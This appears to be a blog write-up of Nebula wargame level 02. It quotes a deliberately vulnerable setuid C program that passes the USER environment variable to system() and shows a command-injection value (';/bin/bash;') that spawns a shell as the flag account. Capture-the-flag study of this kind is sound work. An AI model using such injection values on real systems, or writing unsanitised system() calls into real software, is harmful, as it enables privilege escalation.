---
layout: post
title: "Nebula02"
tags: Nebula
description: "Interrupting the execution flow with the command injection"
---


## Level 02

> There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it? To do this level, log in as the `level02` account with the password `level02`. Files for this level can be found in `/home/flag02`.

```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
}
```

## Getting the flag

We can see in the source code above that the program is using the `USER` global variable, and used it as an input.  
As before, the binary is located in the `/home/flag02/` directory.  

```
level02@nebula:/home/flag02$ ./flag02 
about to call system("/bin/echo  is cool")
is cool

level02@nebula:/home/flag02$ getflag 
getflag is executing on a non-flag account, this doesn't count
```

Let's play with the `USER` variable to get the flag:

```
level02@nebula:/home/flag02$ export USER=';/bin/bash;'

level02@nebula:/home/flag02$ ./flag02 

about to call system("/bin/echo ;/bin/bash; is cool")

flag02@nebula:/home/flag02$ getflag
You have successfully executed getflag on a target account
```

We are using the `;` symbol to interrupt the execution flow of the application and instead of echoing the initial string the program will execute `/bin/bash`
